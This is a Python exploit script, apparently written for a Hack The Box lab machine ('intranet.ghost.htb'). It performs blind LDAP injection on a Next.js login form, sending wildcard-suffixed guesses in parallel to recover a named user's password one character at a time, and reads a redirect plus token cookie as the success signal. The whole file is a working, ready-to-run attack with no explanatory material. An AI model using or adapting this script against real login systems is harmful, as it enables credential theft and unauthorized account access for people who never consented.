#!/usr/bin/env python3
"""
Blind LDAP injection – extract password quickly using parallel requests.
Usage: python ldap_injec.py <username> [-v] [-c CONCURRENCY]
"""

import requests
import sys
import string
import time
import getopt
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "http://intranet.ghost.htb:8008/login"
ACTION_ID = "c471eb076ccac91d6f828b671795550fd5925940"
ACTION_KEY = "k2982904007"

HEADERS = {
    "Host": "intranet.ghost.htb:8008",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/x-component",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://intranet.ghost.htb:8008/login",
    "Next-Action": ACTION_ID,
    "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
    "Origin": "http://intranet.ghost.htb:8008",
    "Connection": "keep-alive",
    "Priority": "u=0",
}

CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"

def send_login(session, username, secret):
    """Send login request using a persistent session."""
    data = {
        "1_$ACTION_REF_1": "",
        "1_$ACTION_1:0": f'{{"id":"{ACTION_ID}","bound":"$@1"}}',
        "1_$ACTION_1:1": "[{}]",
        "1_$ACTION_KEY": ACTION_KEY,
        "1_ldap-username": username,
        "1_ldap-secret": secret,
        "0": '[{},"$K1"]'
    }
    files = {k: (None, v) for k, v in data.items()}
    try:
        resp = session.post(URL, headers=HEADERS, files=files,
                            allow_redirects=False, timeout=10)
        if resp.status_code == 303 and "Set-Cookie" in resp.headers:
            if "token" in resp.headers["Set-Cookie"]:
                return True
        return False
    except requests.RequestException:
        return False

def test_char(session, username, prefix, ch):
    """Test a single character candidate. Returns (ch, success)."""
    secret = prefix + ch + "*"
    success = send_login(session, username, secret)
    return ch, success

def extract_password(username, concurrency=20, verbose=False):
    prefix = ""
    print(f"[*] Extracting password for user: {username} (concurrency={concurrency})")

    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        while True:
            # Submit all character tests for this position
            futures = [
                executor.submit(test_char, requests.Session(), username, prefix, ch)
                for ch in CHARSET
            ]

            found = False
            for future in as_completed(futures):
                ch, success = future.result()
                if success:
                    prefix += ch
                    print(f"[+] Found character: {ch} (current: {prefix})")
                    found = True
                    # Cancel remaining futures (optional but can save time)
                    for f in futures:
                        f.cancel()
                    break

            if not found:
                # No character matched – test exact prefix
                if verbose:
                    print(f"[*] Testing exact prefix: {prefix}")
                if send_login(requests.Session(), username, prefix):
                    print(f"[+] Password found: {prefix}")
                    return prefix
                else:
                    print("[!] Exact match failed. Password may contain characters not in CHARSET.")
                    return prefix

            # Tiny delay to avoid flooding; adjust as needed
            time.sleep(0.05)

def usage():
    print("Usage: python ldap_injec.py <username> [-v] [-c CONCURRENCY]")
    print("  -v           verbose mode (show all attempts)")
    print("  -c NUM       concurrency level (default 20)")

if __name__ == "__main__":
    try:
        opts, args = getopt.getopt(sys.argv[1:], "vc:")
    except getopt.GetoptError:
        usage()
        sys.exit(1)

    verbose = False
    concurrency = 20
    for o, a in opts:
        if o == "-v":
            verbose = True
        elif o == "-c":
            concurrency = int(a)

    if len(args) < 1:
        usage()
        sys.exit(1)

    target_user = args[0]
    password = extract_password(target_user, concurrency, verbose)
    print(f"\n[+] Final password for {target_user}: {password}")
